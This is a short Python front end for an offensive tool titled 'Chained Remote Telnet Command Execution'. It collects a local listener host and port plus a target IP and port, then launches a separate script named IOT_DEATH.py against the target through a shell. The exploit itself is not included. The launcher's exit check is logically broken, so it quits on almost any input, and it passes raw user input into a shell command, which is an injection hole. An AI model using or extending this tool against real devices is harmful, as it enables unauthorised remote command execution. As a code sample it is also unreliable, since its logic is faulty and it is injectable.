import subprocess as sub

class Colors:
    red = '\033[38;2;255;0;0m\033m'
    end = '\033[m'


local_host = input(f"{Colors.red}(Chained Remote Telnet Command Execution){Colors.end} [Enter Local Host]:~#")
local_port = input(f"{Colors.red}(Chained Remote Telnet Command Execution){Colors.end} [Enter Local Port]:~#")
target = input(f"{Colors.red}(Chained Remote Telnet Command Execution){Colors.end} [Enter Target Ip Address]:~#")
remote_port = input(f"{Colors.red}(Chained Remote Telnet Command Execution){Colors.end} [Enter Remote Port]:~#")
if local_port or local_host or target or remote_port == "exit" or local_port or local_host or target or remote_port == "back":
    exit(0)
else:
    sub.call(f"python3 IOT_DEATH.py -lh {local_host} -lp {local_port} -t {target} -p {remote_port}", shell=True)
